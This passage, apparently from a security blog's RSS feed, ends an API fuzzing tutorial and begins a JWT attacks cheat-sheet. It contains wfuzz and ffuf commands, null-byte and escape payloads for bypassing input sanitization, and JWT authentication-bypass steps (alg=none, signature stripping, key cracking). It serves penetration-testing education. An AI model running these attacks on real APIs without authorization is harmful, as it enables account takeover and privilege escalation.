+&lt;p&gt;Then we can check if there is any abnormal response by looking at Code Status and Size of the Response, we could set up more than just one variable to test, we could actually choose an endpoint with multiple parameters and assign them all as &lt;code&gt;{{naughtyValue}}&lt;/code&gt;  variables, then start fuzzing, but this is something that we can do using &lt;code&gt;Burp Intuder&lt;/code&gt; &amp;amp; &lt;code&gt;Wfuzz&lt;/code&gt; (and that&amp;rsquo;s what we&amp;rsquo;ll do in the next section), Postman collection runner will help us fuzz for an entire collection (or just parts of it) , which is something that is not available in &lt;code&gt;Burp&lt;/code&gt; &amp;amp; &lt;code&gt;Wfuzz&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;scenario-2-fuzzing-parameters-in-post-requests&#34;&gt;Scenario 2: Fuzzing Parameters in POST Requests&lt;/h4&gt;
+&lt;p&gt;We could also fuzz for parameters inside POST Requests, go to the request that you want to test, modify the parameters inside:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_210000.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Start the Collection Runner and choose the endpoints where you modified the parameters to &lt;code&gt;{{naughtyValue}}&lt;/code&gt; and run the Collection Runner:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_210114.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can now see that the parameters that we specified are now different in each iteration:&lt;/p&gt;
+&lt;p&gt;Iteration 142:
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_211713.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Iteration 134:
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_211725.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Keep in mind that this is a &lt;code&gt;Battering Ram Attack Mode&lt;/code&gt;, you can take a look at the &lt;a href=&#34;https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types&#34;&gt;4 Attacks Types Here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;For &lt;code&gt;Pitchforck&lt;/code&gt; :&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;This is How we set the payload file&lt;/td&gt;
+&lt;td&gt;Preview in Postman Collection Runner&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_222423.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_222612.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Now in each iteration, each of the parameters will have its value from the payload file.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The total number of requests generated in the attack is the number of payloads in the smallest payload set.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;For &lt;code&gt;Cluster Bomb&lt;/code&gt; :&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;This is How we set the payload file&lt;/td&gt;
+&lt;td&gt;Preview in Postman Collection Runner&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_224247.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_224435.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The total number of requests generated in the attack is the product of the number of payloads in all defined payload sets - this may be extremely large.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We could&amp;rsquo;ve used of course different payload list for each parameter (for example &lt;code&gt;naughtyValue1&lt;/code&gt; for &lt;em&gt;ewallet&lt;/em&gt; and &lt;code&gt;naughtyValue2&lt;/code&gt; for &lt;em&gt;contact&lt;/em&gt;, but we need to append the two lists , this is similar to Sniper Attack in Burp Intruder, the Difference is that we can run this across all API endpoints , while in burp we have to run the attack for each endpoint manually.&lt;/p&gt;
+&lt;h3 id=&#34;75---fuzzing-deep-w-burpsuite&#34;&gt;7.5 - Fuzzing Deep w/ &lt;em&gt;Burpsuite&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;Fuzzing with Burp is very common so I guess you can skip this section, we are not going to dive deep here anyway.&lt;/p&gt;
+&lt;p&gt;To send the request to Burp, just set up the proxy in Postman and Burp:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_211050.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Send the request from Postman and you&amp;rsquo;ll see the request in Burp HTTP History:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_221016.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can now send it to the intruder, set parameters to fuzz, and payload sets and attacks type then start the attack &amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_221114.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;76---fuzzing-deep-w-wfuzz&#34;&gt;7.6 - Fuzzing Deep w/ &lt;em&gt;Wfuzz&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;One advantage of &lt;code&gt;Wfuzz&lt;/code&gt; is that it’s considerably faster than Burp Suite, so we can increase our payload size.&lt;/p&gt;
+&lt;p&gt;This is an example on how to perform Battering ram Attack, specifying the access_token for authentication and the body data. we filtered &lt;code&gt;400&lt;/code&gt; Code Status, the &lt;code&gt;-p 127.0.0.1:8080&lt;/code&gt; is for proxying your request to Burp, which is optional of course, you can use it to see if the requests that are by &lt;code&gt;Wfuzz&lt;/code&gt; are malformed so that you can fix something in your one-liner:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wfuzz -z file,/home/kali/big-list-of-naughty-strings.txt -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/json&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x-access-token: [...]&amp;#34;&lt;/span&gt; --hc &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; -X PUT -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;user\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;pass\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;id\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;name\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;is_admin\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;account_balance\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;TARGET_URL&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;77---fuzzing-wide-for-improper-assets-management&#34;&gt;7.7 - Fuzzing Wide for Improper Assets Management&lt;/h3&gt;
+&lt;p&gt;Improper assets management vulnerabilities arise when an organization exposes APIs that are either retired, in a test environment, or still in development. In any of these cases, there is a good chance the API has fewer protections than its supported production counterparts. Improper assets management might affect only a single endpoint or request, so it’s often useful to fuzz wide to test if improper assets management exists for any request across an API.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In order to fuzz wide for this problem, it helps to have a specification of the API or a
+collection file that will make the requests available in Postman. This section assumes
+you have an API collection available&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;You can find improper assets management vulnerabilities by paying close attention to outdated API documentation. If the production version of the sample API is &lt;strong&gt;v2&lt;/strong&gt;, so it would be a good idea to test a few keywords, like &lt;strong&gt;v1&lt;/strong&gt;, &lt;strong&gt;v3&lt;/strong&gt;, &lt;strong&gt;test&lt;/strong&gt;, &lt;strong&gt;mobile&lt;/strong&gt;, &lt;strong&gt;uat&lt;/strong&gt;, &lt;strong&gt;dev&lt;/strong&gt;, and &lt;strong&gt;old&lt;/strong&gt;, as well as any interesting paths discovered during analysis or reconnaissance testing. Additionally, some API providers will allow access to administrative functionality by adding /internal/ to the path before or after the versioning, which would look like this: &lt;code&gt;/api/v2/internal/users&lt;/code&gt; &lt;code&gt;/api/internal/v2/users&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;You can use Postman Collection Runner, use &amp;ldquo;Find and Replace&amp;rdquo; to replace  &lt;code&gt;v3&lt;/code&gt; across all the collection by &lt;code&gt;v1&lt;/code&gt; , run the collection and look for anomalies, you can repeat the same for &lt;code&gt;dev&lt;/code&gt;, &lt;code&gt;test&lt;/code&gt; &amp;hellip; (This is Wide Fuzzing)&lt;/p&gt;
+&lt;p&gt;To make our testing easier, we’ll set up the same test for status codes of 200 we used earlier in this chapter. If the API provider typically responds with status code 404 for non existent resources, a 200 response for those resources would likely indicate that the API is vulnerable.&lt;/p&gt;
+&lt;p&gt;. If you discover an improper asset management vulnerability,
+your next step will be to test the non-production endpoint for additional
+weaknesses.&lt;/p&gt;
+&lt;h2 id=&#34;8---testing-request-methods-with-wfuzz&#34;&gt;8 - Testing Request Methods with Wfuzz&lt;/h2&gt;
+&lt;p&gt;You can fuzz an endpoint&amp;rsquo;s supported HTTP Methods:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wfuzz -z list,GET-HEAD-POST-PUT-PATCH-TRACE-OPTIONS-CONNECT- -X FUZZ http://target.com/api/v2/account
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;********************************************************
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* Wfuzz 3.1.0 - The Web Fuzzer *
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;********************************************************
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Target: http://testsite.com/api/v2/account
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Total requests: 8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==========================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ID Response Lines Word Chars Payload
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==========================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000008: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CONNECT&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000004: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUT&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000005: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PATCH&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000007: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OPTIONS&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000006: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TRACE&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000002: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HEAD&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000001: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;2610&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000003: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;1503&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can now see valid Methods (those with Status Code &lt;code&gt;200&lt;/code&gt; and Methods Not Allowed ones &lt;code&gt;405&lt;/code&gt; )&lt;/p&gt;
+&lt;h2 id=&#34;9---fuzzing-deeper-to-bypass-input-sanitization&#34;&gt;9 - Fuzzing “Deeper” to Bypass Input Sanitization&lt;/h2&gt;
+&lt;p&gt;In case you are fuzzing a sanitized parameter, let&amp;rsquo;s say that the email field only accept emails formats ( for example &lt;code&gt;user@gmail.com&lt;/code&gt; ) in this case you can append a string terminator (&lt;code&gt;%00&lt;/code&gt; in this case) to the email, followed by the variable that will be fuzzed:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a@b.com%00§test§&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Better yet, there are enough possible symbols to send that you could add a second payload position for typical escape characters, like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a@b.com§escape§§test§&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;String terminators you can use&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;%00
+0x00
+//
+;
+%
+!
+?
+[]
+%5B%5D
+%09
+%0a
+%0b
+%0c
+%0e
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use a set of potential escape symbols for the §escape§ payload and the payload you want to execute as the §test§. To perform this test, use Burp Suite’s cluster bomb attack.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_234218.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;10---summary&#34;&gt;10 - Summary&lt;/h2&gt;
+&lt;p&gt;This blog covered the art of fuzzing APIs, one of the most important attack techniques you’ll need to master. By sending the right inputs to the right parts of an API request, you can discover a variety of API weaknesses. We covered two strategies, fuzzing wide and deep, useful for testing the entire attack surface of large APIs.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>JWTs Attacks Cheat-Sheet</title>
+      <link>https://flowhero.github.io/newblog/posts/jwts-attacks/</link>
+      <pubDate>Sun, 13 Aug 2023 11:47:29 +0100</pubDate>
+      
+      <guid>https://flowhero.github.io/newblog/posts/jwts-attacks/</guid>
+      <description>Toolkits jwt.io hashcat JSON Web Key Burp Extension jwt_tool.py rsa_sign2n I - JWKS common locations If you don&amp;rsquo;t know what JWTs are yet, please check https://jwt.io/introduction, it&amp;rsquo;ll take you about 5 minutes to read.
+First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:
+/.well-known/jwks.json /openid/connect/jwks.json /jwks.json /api/keys /api/v1/keys To automate this, you can use common.</description>
+      <content>&lt;h2 id=&#34;toolkits&#34;&gt;Toolkits&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://jwt.io&#34;&gt;jwt.io&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hashcat&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;JSON Web Key&lt;/code&gt; Burp Extension&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;jwt_tool.py&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;rsa_sign2n&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/1aAH0mMomx1dLidhoNCVmNw.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;i---jwks-common-locations&#34;&gt;I - JWKS common locations&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;If you don&amp;rsquo;t know what JWTs are yet, please check &lt;a href=&#34;https://jwt.io/introduction&#34;&gt;https://jwt.io/introduction&lt;/a&gt;, it&amp;rsquo;ll take you about 5 minutes to read.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/.well-known/jwks.json&lt;/li&gt;
+&lt;li&gt;/openid/connect/jwks.json&lt;/li&gt;
+&lt;li&gt;/jwks.json&lt;/li&gt;
+&lt;li&gt;/api/keys&lt;/li&gt;
+&lt;li&gt;/api/v1/keys&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To automate this, you can use &lt;code&gt;common.txt&lt;/code&gt; wordlist under Web-Contet directory on the SecLists Github Repository:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -u &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;TARGET&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.com/FUZZ -w ~/tools/SecLists-2023.2/Discovery/Web-Content/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are two standard header claims that can direct the service to the &lt;strong&gt;Public Key&lt;/strong&gt; for verification:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;jku&lt;/strong&gt; - a claim pointing towards the JWKS URL&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;x5u&lt;/strong&gt; - a claim pointing towards the X509 certificate location (could be in a JWKS file)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This is how JWTs keys would look like :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kty&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AQAB&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ii---attacks-on-jwt&#34;&gt;II - Attacks on JWT&lt;/h2&gt;
+&lt;h3 id=&#34;21---jwt-authentication-bypass-via-unverified-signature&#34;&gt;2.1 - JWT authentication bypass via unverified signature&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Just change the JWT body(=payload) and send the request leaving the signature as is and check if the server is checking the signature.
+( For example if in the payload part of the token you can just change &amp;ldquo;name&amp;rdquo; to another user&amp;rsquo;s name and use the updated token to see if you can access his account )&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;22---jwt-authentication-bypass-via-flawed-signature-verification&#34;&gt;2.2 - JWT authentication bypass via flawed signature verification&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Change Body&lt;/li&gt;
+&lt;li&gt;Change &lt;em&gt;alg&lt;/em&gt; to &lt;strong&gt;none&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Remove Signature part (Not the dot at the end)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;23---jwt-authentication-bypass-via-weak-signing-key&#34;&gt;2.3 - JWT authentication bypass via weak signing key&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Crack Key used for Signature&lt;/li&gt;
+&lt;/ul&gt;
